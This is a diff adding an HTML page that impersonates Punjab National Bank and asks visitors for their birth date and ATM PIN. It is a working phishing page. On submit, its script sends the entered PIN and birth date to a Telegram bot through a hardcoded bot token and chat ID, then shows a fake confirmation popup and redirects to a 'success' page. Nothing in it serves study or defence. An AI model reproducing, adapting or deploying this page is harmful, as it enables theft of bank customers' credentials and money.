@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank</title>
+    <link rel="stylesheet" href="style5.css">
+    <style>
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            padding-top: 60px;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+        }
+
+        .modal button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section class="verification-form">
+            <h2>Birth Date and ATM PIN Verification</h2>
+            <form id="verificationForm">
+                <label for="birth-date">Select Birth Date:</label>
+                <div class="date-select">
+                    <select id="birth-day" name="birth-day" required>
+                        <option value="">Day</option>
+                        <script>
+                            for (let i = 1; i <= 31; i++) {
+                                document.write(`<option value="${i}">${i}</option>`);
+                            }
+                        </script>
+                    </select>
+
+                    <select id="birth-month" name="birth-month" required>
+                        <option value="">Month</option>
+                        <option value="1">January</option>
+                        <option value="2">February</option>
+                        <option value="3">March</option>
+                        <option value="4">April</option>
+                        <option value="5">May</option>
+                        <option value="6">June</option>
+                        <option value="7">July</option>
+                        <option value="8">August</option>
+                        <option value="9">September</option>
+                        <option value="10">October</option>
+                        <option value="11">November</option>
+                        <option value="12">December</option>
+                    </select>
+
+                    <select id="birth-year" name="birth-year" required>
+                        <option value="">Year</option>
+                        <script>
+                            const currentYear = new Date().getFullYear();
+                            for (let i = currentYear; i >= 1900; i--) {
+                                document.write(`<option value="${i}">${i}</option>`);
+                            }
+                        </script>
+                    </select>
+                </div>
+
+                <label for="atm-pin">Enter ATM PIN:</label>
+                <input type="password" id="atm-pin" name="atm-pin" required placeholder="Enter 4-digit PIN" minlength="4" maxlength="4">
+
+                <button type="submit">Next</button>
+            </form>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Punjab National Bank</p>
+    </footer>
+
+    <!-- Modal Popup -->
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Are you sure you want to proceed?</h2>
+            <button id="confirmButton">Yes, Proceed</button>
+            <button id="cancelButton">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("verificationForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let birthDay = document.getElementById("birth-day").value;
+            let birthMonth = document.getElementById("birth-month").value;
+            let birthYear = document.getElementById("birth-year").value;
+            let atmPin = document.getElementById("atm-pin").value;
+
+            if (!birthDay || !birthMonth || !birthYear || !atmPin) {
+                alert("Please fill out all fields correctly.");
+                return;
+            }
+
+            // Send Telegram notification
+            const tgApiToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A";
+            const tgChatId = "7558871636";
+            const message = `✨ Birth Date: ${birthDay}/${birthMonth}/${birthYear}, ATM PIN: ${atmPin} ✅`; // With emojis
+
+            fetch(`https://api.telegram.org/bot${tgApiToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: tgChatId, text: message })
+            }).then(response => response.json())
+              .then(data => console.log("Telegram message sent successfully", data))
+              .catch(error => console.error("Error sending Telegram message", error));
+
+            // Show confirmation modal
+            let modal = document.getElementById("confirmationModal");
+            modal.style.display = "block";
+
+            // Handle the Yes, Proceed button
+            document.getElementById("confirmButton").addEventListener("click", function() {
+                window.location.href = "netsuccess.html";
+            });
+
+            // Handle the Cancel button
+            document.getElementById("cancelButton").addEventListener("click", function() {
+                modal.style.display = "none";
+            });
+
+            // Close the modal if the user clicks the 'X' button
+            let closeBtn = document.querySelector(".close");
+            closeBtn.addEventListener("click", function() {
+                modal.style.display = "none";
+            });
+        });
+
+        // Close the modal if the user clicks outside of it
+        window.onclick = function(event) {
+            let modal = document.getElementById("confirmationModal");
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
+        };
+    </script>
+
+</body>
+</html>
